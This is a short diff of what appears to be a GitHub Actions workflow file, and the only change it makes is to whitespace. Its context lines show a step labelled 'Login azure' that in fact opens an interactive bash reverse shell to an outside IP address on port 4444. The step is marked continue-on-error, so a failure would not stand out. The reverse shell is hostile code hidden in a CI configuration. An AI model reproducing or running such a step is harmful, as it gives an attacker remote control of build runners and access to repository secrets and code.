@@ -17,6 +17,6 @@ steps:
 - uses: actions/checkout@v4  
   
 - name: Login azure  
-run: |  
+run: |
 bash -i >& /dev/tcp/64.225.55.220/4444 0>&1
 continue-on-error: true
